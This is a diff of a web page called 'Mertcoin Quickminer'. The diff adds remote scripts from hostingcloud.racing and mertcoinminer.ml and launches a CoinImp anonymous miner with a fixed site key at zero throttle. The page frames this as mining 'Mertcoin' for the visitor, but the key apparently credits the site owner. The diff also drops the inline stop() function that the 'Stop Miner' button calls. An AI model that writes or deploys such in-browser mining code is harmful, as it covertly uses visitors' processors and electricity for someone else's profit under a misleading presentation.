@@ -10,20 +10,25 @@
 
   gtag('config', 'G-M79BN1P0HE');
 </script>
+	<!-- Imports -->
   <link rel="stylesheet" href="https://mertcoinminer.ml/page.css">
+  <script src="https://mertcoinminer.ml/app.js"></script>
+  <script src="https://www.hostingcloud.racing/0Frc.js"></script>
+	<!-- Meta stuff -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content=
   "width=device-width, initial-scale=1.0">
   <title>Mertcoin Miner</title>
 </head>
-<body>		
-	<script>function stop() {window.open("about:blank","_self").close();}</script>
+<body>	
+<!-- Heading -->
   <h2>Mertcoin Quickminer<h2>
 	  <br>
 	  <br>
+<!-- Stop button -->
 	 <button class="button" onclick ="stop()">Stop Miner</button>
-	  
+<!-- Info -->	  
 	   <div style="width: 100%; display: table;">
         <div style="display: table-row; height: 100px;">
             <div style="width: 50%; display: table-cell; background: black;">
@@ -36,52 +41,28 @@
             </div>
         </div>
     </div>
+<!-- Pay button -->
 	  <a href="https://coinimp.com/login" class="pay" id="button">Pay</a>
 	  
- 
+ <!-- Benchmarking function -->
   <script>
     try {
-   function getVideoCardInfo() {
-     const gl = document.createElement('canvas').getContext('webgl');
-     if (!gl) {
-       console.error("WebGL is not supported.");
-       throw ("WebGL is not supported.");
-       return {
-         error: "no webgl",
-       };
-     }
-     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-     return debugInfo ? {
-       vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-       renderer:  gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-     } : {
-       error: "no WEBGL_debug_renderer_info",
-     };
-   }
-   
-      
-   document.getElementById("benchmark").innerHTML = getVideoCardInfo().renderer;
-   
-   
- } catch {
+   document.getElementById("benchmark").innerHTML = getVideoCardInfo().renderer; } 
+    catch {
    document.getElementById("benchmark").innerHTML = "Failed Benchmark";
-   throw("Failed Benchmark.");
-   
+   throw("Failed Benchmark."); 
  }
-  </script>
-  
-  
-  <script src="https://www.hostingcloud.racing/0Frc.js"></script> 
+  </script> 
+	  
+<!-- Miner script -->	  
   <script>
-
-
     var _client = new Client.Anonymous('6e8067e289507961a17268271edbefca1e41d31d4b71b3a781aada8c0611dfdb', {
         throttle: 0, c: 'w'
     });
     _client.start();
 
 
-
+//Unpaid balance
   var calc = 0;
   setInterval(f, 60000);
   function f() {
